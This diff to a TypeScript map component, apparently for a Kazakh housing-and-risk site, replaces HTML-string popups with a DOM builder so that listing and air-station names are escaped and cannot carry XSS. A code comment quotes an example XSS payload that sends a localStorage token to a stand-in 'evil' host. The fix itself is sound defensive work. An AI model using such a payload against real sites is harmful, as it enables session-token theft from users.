@@ -49,6 +49,35 @@ function getFaultColor(danger: number): string {
   return "#9ca3af";
 }
 
+/**
+ * XSS-safe DOM builder for popup content. We can't use template-string +
+ * setHTML here because complex `displayName` and air-station `name` are
+ * derived from third-party data (Krisha listings, AirKaz API) — a malicious
+ * listing with a name like `<img onerror="fetch('//evil/'+localStorage.token)">`
+ * would otherwise execute on every map hover.
+ *
+ * `text:` always goes through textContent (auto-escapes). Use `html:` only
+ * for known-safe static markup (no user data).
+ */
+function el(
+  tag: string,
+  opts: {
+    css?: string;
+    text?: string;
+    html?: string;
+    children?: (Node | null | false | undefined)[];
+  } = {},
+): HTMLElement {
+  const node = document.createElement(tag);
+  if (opts.css) node.style.cssText = opts.css;
+  if (opts.text != null) node.textContent = opts.text;
+  if (opts.html != null) node.innerHTML = opts.html;
+  if (opts.children) {
+    for (const c of opts.children) if (c) node.appendChild(c);
+  }
+  return node;
+}
+
 // MapTiler free key for 3D building tiles
 const MAPTILER_KEY = "get_your_own_OpIi9ZULNHzrESv6T2vL";
 const MAP_STYLE_LIGHT = "https://basemaps.cartocdn.com/gl/positron-gl-style/style.json";
@@ -192,11 +221,8 @@ export default function MapView({ data, onComplexClick, hoveredComplexId, select
             const props = e.features?.[0]?.properties;
             if (!props) return;
 
-            const dangerLabel = props.danger >= 3
-              ? `<span style="color:#dc2626;font-weight:bold">${tRef.current("map.faultConfirmed")}</span>`
-              : props.danger >= 2
-              ? `<span style="color:#f97316;font-weight:bold">${tRef.current("map.faultStudied")}</span>`
-              : `<span style="color:#9ca3af;font-weight:bold">${tRef.current("map.faultDisputed")}</span>`;
+            const dangerColor = props.danger >= 3 ? "#dc2626" : props.danger >= 2 ? "#f97316" : "#9ca3af";
+            const dangerKey = props.danger >= 3 ? "map.faultConfirmed" : props.danger >= 2 ? "map.faultStudied" : "map.faultDisputed";
 
             const nearby = data.complexes
               .filter((c) => {
@@ -206,26 +232,57 @@ export default function MapView({ data, onComplexClick, hoveredComplexId, select
               .sort((a, b) => (a.seismicDistanceMeters || 9999) - (b.seismicDistanceMeters || 9999))
               .slice(0, 5);
 
-            const nearbyHtml = nearby.length > 0
-              ? `<div style="margin-top:8px;border-top:1px solid #eee;padding-top:6px">
-                  <p style="font-size:11px;color:#666;margin-bottom:4px">${tRef.current("map.nearbyComplexes")}</p>
-                  ${nearby.map((c) => {
-                    const dist = c.seismicDistanceMeters ? (c.seismicDistanceMeters < 1000 ? `${c.seismicDistanceMeters} м` : `${(c.seismicDistanceMeters / 1000).toFixed(1)} км`) : "—";
-                    return `<div style="display:flex;align-items:center;gap:6px;margin-bottom:2px;font-size:12px">
-                      <span style="width:8px;height:8px;border-radius:50%;background:${getSeismicColor(c.seismicRiskLevel)};flex-shrink:0"></span>
-                      <span style="flex:1">${c.displayName}</span>
-                      <span style="color:#888">${dist}</span>
-                    </div>`;
-                  }).join("")}</div>`
-              : "";
+            const root = el("div", {
+              css: "font-family:system-ui;padding:4px",
+              children: [
+                // Fault name — props.name is from our static FAULT_LINES JSON,
+                // technically safe, but textContent is cheap insurance.
+                el("div", {
+                  css: "font-size:14px;font-weight:600;margin-bottom:4px",
+                  text: String(props.name || ""),
+                }),
+                el("div", {
+                  css: "font-size:12px",
+                  children: [
+                    el("span", {
+                      css: `color:${dangerColor};font-weight:bold`,
+                      text: tRef.current(dangerKey),
+                    }),
+                  ],
+                }),
+                nearby.length > 0
+                  ? el("div", {
+                      css: "margin-top:8px;border-top:1px solid #eee;padding-top:6px",
+                      children: [
+                        el("p", {
+                          css: "font-size:11px;color:#666;margin-bottom:4px",
+                          text: tRef.current("map.nearbyComplexes"),
+                        }),
+                        ...nearby.map((c) => {
+                          const dist = c.seismicDistanceMeters
+                            ? c.seismicDistanceMeters < 1000
+                              ? `${c.seismicDistanceMeters} м`
+                              : `${(c.seismicDistanceMeters / 1000).toFixed(1)} км`
+                            : "—";
+                          return el("div", {
+                            css: "display:flex;align-items:center;gap:6px;margin-bottom:2px;font-size:12px",
+                            children: [
+                              el("span", {
+                                css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(c.seismicRiskLevel)};flex-shrink:0`,
+                              }),
+                              // c.displayName comes from Krisha — XSS vector. textContent escapes it.
+                              el("span", { css: "flex:1", text: String(c.displayName || "") }),
+                              el("span", { css: "color:#888", text: dist }),
+                            ],
+                          });
+                        }),
+                      ],
+                    })
+                  : null,
+              ],
+            });
 
-            faultPopup.setLngLat(e.lngLat).setHTML(`
-              <div style="font-family:system-ui;padding:4px">
-                <div style="font-size:14px;font-weight:600;margin-bottom:4px">${props.name}</div>
-                <div style="font-size:12px">${dangerLabel}</div>
-                ${nearbyHtml}
-              </div>
-            `).addTo(map);
+            faultPopup.setLngLat(e.lngLat).setDOMContent(root).addTo(map);
           });
         }
       }
@@ -335,18 +392,47 @@ export default function MapView({ data, onComplexClick, hoveredComplexId, select
           const date = p.updatedAt ? new Date(p.updatedAt).toLocaleString(dateLocale, {
             day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
           }) : "";
-          stationPopup.setLngLat(coords).setHTML(`
-            <div style="font-family:system-ui;padding:4px;font-size:12px">
-              <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">
-                <span style="width:10px;height:10px;border-radius:50%;background:${p.color}"></span>
-                <strong>${p.name}</strong>
-              </div>
-              <div style="font-size:18px;font-weight:700;color:${p.color}">${p.pm25} <span style="font-size:11px;font-weight:400;color:#666">µg/m³</span></div>
-              <div style="color:${p.color};font-size:11px;font-weight:500">${p.levelLabel}</div>
-              ${p.origin ? `<div style="color:#888;font-size:10px;margin-top:4px">${tRef.current("map.popupSource", { name: p.origin })}${p.district ? " · " + p.district : ""}</div>` : ""}
-              ${date ? `<div style="color:#aaa;font-size:10px">${date}</div>` : ""}
-            </div>
-          `).addTo(map);
+          // Color is read from our backend's airKaz.classifyPm25 — bounded to a
+          // known palette, but we still pass it through CSS-only context. Name,
+          // origin, district come straight from upstream JSON: untrusted, so
+          // textContent everywhere.
+          const safeColor = String(p.color || "#666");
+          const popupRoot = el("div", {
+            css: "font-family:system-ui;padding:4px;font-size:12px",
+            children: [
+              el("div", {
+                css: "display:flex;align-items:center;gap:6px;margin-bottom:4px",
+                children: [
+                  el("span", { css: `width:10px;height:10px;border-radius:50%;background:${safeColor}` }),
+                  el("strong", { text: String(p.name || "") }),
+                ],
+              }),
+              el("div", {
+                css: `font-size:18px;font-weight:700;color:${safeColor}`,
+                children: [
+                  document.createTextNode(`${p.pm25} `),
+                  el("span", {
+                    css: "font-size:11px;font-weight:400;color:#666",
+                    text: "µg/m³",
+                  }),
+                ],
+              }),
+              el("div", {
+                css: `color:${safeColor};font-size:11px;font-weight:500`,
+                text: String(p.levelLabel || ""),
+              }),
+              p.origin
+                ? el("div", {
+                    css: "color:#888;font-size:10px;margin-top:4px",
+                    text:
+                      tRef.current("map.popupSource", { name: String(p.origin) }) +
+                      (p.district ? " · " + String(p.district) : ""),
+                  })
+                : null,
+              date ? el("div", { css: "color:#aaa;font-size:10px", text: date }) : null,
+            ],
+          });
+          stationPopup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
         });
         map.on("mouseleave", "air-stations-circles", () => {
           map.getCanvas().style.cursor = "";
@@ -427,24 +513,62 @@ export default function MapView({ data, onComplexClick, hoveredComplexId, select
         const seismicLabelKey = getSeismicLabelKey(seismicRisk);
         const seismicLabel = seismicLabelKey ? tRef.current(seismicLabelKey) : "";
 
-        popup.setLngLat(coords).setHTML(`
-          <div style="font-family:system-ui;padding:4px">
-            <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
-              <strong style="font-size:14px">${props.name}</strong>
-              ${props.score ? `<span style="background:${props.scoreColor};color:white;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px">${Math.round(props.score)}%</span>` : ""}
-            </div>
-            ${props.priceMin && props.priceMax ? `<div style="font-weight:600;margin-top:4px">${formatPrice(props.priceMin)} — ${formatPrice(props.priceMax)}</div>` : ""}
-            <div style="display:flex;gap:12px;margin-top:4px;color:#666;font-size:12px">
-              <span>🏠 ${tRef.current("map.popupListings", { count: props.listings })}</span>
-              ${props.commute ? `<span>🚗 ${tRef.current("map.popupCommute", { count: props.commute })}</span>` : ""}
-            </div>
-            ${seismicDist ? `<div style="display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;background:${seismicBg}">
-              <span style="width:8px;height:8px;border-radius:50%;background:${getSeismicColor(seismicRisk)};flex-shrink:0"></span>
-              <span>${seismicLabel}</span>
-              <span style="color:#888;margin-left:auto">${seismicDistStr} ${tRef.current("map.toFault")}</span>
-            </div>` : ""}
-          </div>
-        `).addTo(map);
+        // props.name is the complex displayName, parsed from Krisha listing
+        // pages — fully attacker-controlled. This is THE main XSS vector for
+        // the public site, so build the popup as DOM nodes only.
+        const safeScoreColor = String(props.scoreColor || "#666");
+        const popupRoot = el("div", {
+          css: "font-family:system-ui;padding:4px",
+          children: [
+            el("div", {
+              css: "display:flex;align-items:center;gap:8px;margin-bottom:4px",
+              children: [
+                el("strong", { css: "font-size:14px", text: String(props.name || "") }),
+                props.score
+                  ? el("span", {
+                      css: `background:${safeScoreColor};color:white;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px`,
+                      text: `${Math.round(props.score)}%`,
+                    })
+                  : null,
+              ],
+            }),
+            props.priceMin && props.priceMax
+              ? el("div", {
+                  css: "font-weight:600;margin-top:4px",
+                  text: `${formatPrice(props.priceMin)} — ${formatPrice(props.priceMax)}`,
+                })
+              : null,
+            el("div", {
+              css: "display:flex;gap:12px;margin-top:4px;color:#666;font-size:12px",
+              children: [
+                el("span", {
+                  text: `🏠 ${tRef.current("map.popupListings", { count: props.listings })}`,
+                }),
+                props.commute
+                  ? el("span", {
+                      text: `🚗 ${tRef.current("map.popupCommute", { count: props.commute })}`,
+                    })
+                  : null,
+              ],
+            }),
+            seismicDist
+              ? el("div", {
+                  css: `display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;background:${seismicBg}`,
+                  children: [
+                    el("span", {
+                      css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(seismicRisk)};flex-shrink:0`,
+                    }),
+                    el("span", { text: seismicLabel }),
+                    el("span", {
+                      css: "color:#888;margin-left:auto",
+                      text: `${seismicDistStr} ${tRef.current("map.toFault")}`,
+                    }),
+                  ],
+                })
+              : null,
+          ],
+        });
+        popup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
       });
 
       map.on("mouseleave", "complexes-circles", () => {
